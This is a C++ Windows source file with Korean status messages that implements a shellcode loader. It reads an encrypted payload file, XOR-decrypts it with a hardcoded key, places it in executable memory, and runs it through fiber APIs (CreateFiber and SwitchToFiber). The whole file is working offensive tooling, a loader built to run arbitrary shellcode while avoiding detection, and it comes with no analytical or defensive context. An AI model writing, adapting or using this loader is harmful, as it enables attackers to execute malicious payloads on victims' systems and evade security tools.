#include <windows.h>
#include <stdio.h>
#include <vector>
using namespace std;

const BYTE XOR_KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xFF };

bool DecryptShellcode(const char* filepath, vector<BYTE>& out) {
    FILE* fp = nullptr;
    if (fopen_s(&fp, filepath, "rb") != 0 || !fp) {
        printf("[-] 파일 열기 실패: %s\n", filepath);
        return false;
    }
    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    rewind(fp);
    out.resize(size);
    fread(out.data(), 1, size, fp);
    fclose(fp);
    for (size_t i = 0; i < size; ++i)
        out[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];
    return true;
}

int main() {
    char path[MAX_PATH];
    printf("쉘코드 경로 입력: ");
    scanf_s("%s", path, (unsigned)_countof(path));

    vector<BYTE> shellcode;
    if (!DecryptShellcode(path, shellcode)) return 1;

    LPVOID exec = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode.data(), shellcode.size());

    LPVOID currentFiber = ConvertThreadToFiber(NULL);
    if (!currentFiber) {
        printf("[-] ConvertThreadToFiber 실패\n");
        return 1;
    }

    LPVOID shellFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec, NULL);
    if (!shellFiber) {
        printf("[-] CreateFiber 실패\n");
        return 1;
    }

    SwitchToFiber(shellFiber);
    DeleteFiber(shellFiber);
    return 0;
}
